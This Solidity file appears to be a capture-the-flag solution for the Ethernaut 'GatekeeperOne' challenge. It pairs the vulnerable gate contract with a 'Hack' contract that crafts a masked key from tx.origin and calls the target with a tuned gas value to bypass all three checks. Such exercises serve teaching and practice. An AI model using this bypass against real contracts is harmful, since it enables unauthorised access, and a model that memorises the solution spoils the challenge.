pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hack {
    GatekeeperOne gate = GatekeeperOne(0xa767bc01e5ba76dceaafa354bb3cb5f8dc81bfdd);
    bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function enterGate() public returns(bool) {
        bool result = gate.call.gas(32979)(bytes4(keccak256('enter(bytes8)')), key);
        return result;
    }
    
    function getOrigin() public view returns (bytes8){
        return bytes8(tx.origin);
    }
}